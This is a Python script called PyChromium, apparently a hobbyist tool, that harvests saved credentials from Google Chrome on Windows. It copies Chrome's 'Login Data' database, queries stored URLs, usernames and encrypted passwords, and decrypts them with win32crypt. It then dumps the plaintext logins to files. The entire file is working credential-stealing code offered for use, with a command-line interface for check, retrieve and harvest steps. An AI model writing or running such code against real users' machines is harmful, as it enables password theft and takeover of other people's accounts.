'''
	Script	 : PyChromium
	Author	 : Vrori | @Vrorii
	Requires : Python 3.4+ , win32crypt
'''
import os, sys, uuid, sqlite3, getpass, shutil, argparse, win32crypt
from abc import ABCMeta, abstractmethod

# Custom exception class.
class ChromiumException ( Exception ) :
	pass

# Abstract class for ChromiumW and ChromiumL.
class Chromium ( object , metaclass=ABCMeta ) :
	def __init__ ( self ) :
		self.data = [ ]
		self.paths = {
			'Chromium Default' : '',
			'Script Root' : '',
			'Local Storage' : '',
			'Local Temp' : ''
		}

	@abstractmethod
	def GetLocalFolders ( self ) :
		pass
	@abstractmethod
	def GetDefaultFolder ( self ) :
		pass
	@abstractmethod
	def CheckChromiumDatabase ( self ) :
		pass
	@abstractmethod
	def GetChromiumDatabase ( self ) :
		pass
	@abstractmethod
	def HarvestDatabases ( self ) :
		pass
	
# Class responsible for handling Chromium on Windows.
class ChromiumW ( Chromium ) :
	def __init__ ( self ) :
		super ( ) . __init__ ( )

	def GetLocalFolders ( self ) :
		storage = os.path.join ( sys.path [ 0 ], 'storage\\' )
		temp = os.path.join ( sys.path [ 0 ], 'temp\\' )

		if ( os.path.isdir ( storage ) == False ) :
			os.makedirs ( storage )
		if ( os.path.isdir ( temp ) == False ) :
			os.makedirs ( temp )

		self.paths [ 'Script Root' ] = sys.path [ 0 ]
		self.paths [ 'Local Storage' ] = storage
		self.paths [ 'Local Temp' ] = temp

	def GetDefaultFolder ( self ) :
		default = os.path.join ( os.getenv ( 'localappdata' ), 'Google\\Chrome\\User Data\\Default\\' )

		if ( os.path.isdir ( default ) == False ) :
			raise ChromiumException ( "Sorry; but it seems that Google Chrome is not installed on this system." )

		self.paths [ 'Chromium Default' ] = default

	def CheckChromiumDatabase ( self ) :
		self.GetDefaultFolder ( )

		print ( '[+] Verifying Chromium Database...' )
		if ( os.path.isfile ( self.paths [ 'Chromium Default' ] + 'Login Data' ) == False ) :
			raise ChromiumException ( 'Database \'Login Data\' is not present in Chromium\'s Default folder!' )

		print ( '[+] Connecting To Database...' )
		con = sqlite3.connect ( self.paths [ 'Chromium Default' ] + 'Login Data' )
		cur = con.cursor ( )

		print ( '[+] Executing Query...' )
		cur.execute ( 'SELECT action_url, username_value, password_value FROM logins' )

		print ( '[+] Fetching Data From Table...' )
		data = cur.fetchall ( )

		if ( len ( data ) <= 0 ) :
			con.close ( )
			raise ChromiumException ( 'There are no entries to work with. This table is empty!' )

		print ( '\n[!] Total of %s record(s) found!' % len ( data ) )
		con.close ( )

	def GetChromiumDatabase ( self ) :
		self.GetLocalFolders ( )
		self.GetDefaultFolder ( )

		print ( '[+] Verifying Chromium Database...' )
		if ( os.path.isfile ( self.paths [ 'Chromium Default' ] + 'Login Data' ) == False ) :
			raise ChromiumException ( 'Database \'Login Data\' is not present in Chromium\'s Default folder!' )

		print ( '[+] Generating UUID...' )
		ufname = uuid.uuid5 ( uuid.NAMESPACE_DNS, getpass.getuser ( ) ) . hex

		print ( '[+] Copying Database To \'%s\' As \'%s\'' % ( self.paths [ 'Local Temp' ], ufname ) )
		shutil.copy2 (
			self.paths [ 'Chromium Default' ] + 'Login Data',
			self.paths [ 'Local Temp' ] + ufname
		)

		print ( '\n[!] Database Successfully Copied!' )

	def HarvestDatabases ( self ) :
		self.GetLocalFolders ( )

		for file in os.listdir ( self.paths [ 'Local Temp' ] ) :
			print ( '[+] Parsing File \'%s\'' % file )

			print ( '[+] Connecting To \'%s\'' % file )
			con = sqlite3.connect ( self.paths [ 'Local Temp' ] + file )
			cur = con.cursor ( )

			print ( '[+] Executing Query...' )
			cur.execute ( 'SELECT action_url, username_value, password_value FROM logins' )

			print ( '[+] Fetching Data From Table' )
			data = cur.fetchall ( )

			for user in data :
				print ( '  [!] Decrypting -> \'%s\' @ \'%s\'' % ( user [ 1 ], user [ 0 ] ) )

				password = win32crypt.CryptUnprotectData ( user [ 2 ], None, None, None, 0 ) [ 1 ]
				if ( password ) :
					self.data.append ( { 
						'url' : user [ 0 ],
						'username' : user [ 1 ],
						'password' : str ( password . decode ( 'utf-8' ) )
					} )

			print ( '[+] Creating Output File \'%s\' @ \'%s\'' % ( file, self.paths [ 'Local Storage' ] ) )
			outfile = os.path.join ( self.paths [ 'Local Storage' ], file )

			print ( '[+] Writing To Output File \'%s\'' % file )
			with open ( outfile, 'wt' ) as dumper :
				for item in self.data :
					dumper.write ( '%s|%s|%s\n' % ( item [ 'url' ], item [ 'username' ], item [ 'password' ] ) )

			self.data = [ ]
			print ( '\n[!] Database \'%s\' Harvested! :-)' % file )


def main ( action ) :
	print ( 'PyChromium ( Version 0.1 Build 11102016 )\n' )

	W = ChromiumW ( )
	if ( action == 'check' ) :
		W . CheckChromiumDatabase ( )
	elif ( action == 'retrieve' ) :
		W . GetChromiumDatabase ( )
	elif ( action == 'harvest' ) :
		W . HarvestDatabases ( )
	else :
		print ( '%s is not a recognized action. Please use -h if you need help...' % action )

if __name__ == '__main__' :
	parser = argparse.ArgumentParser ( description='PyChromium allows the user to extract login information from Google Chrome in three simple steps.' )
	parser.add_argument ( '--action', dest='action', help='check, retrieve or harvest' )
	parser.add_argument ( '--version', action='version', version='%(prog)s 0.1 Build 10142016' )
	args = parser.parse_args ( sys.argv [ 1: ] )

	main ( args.action )
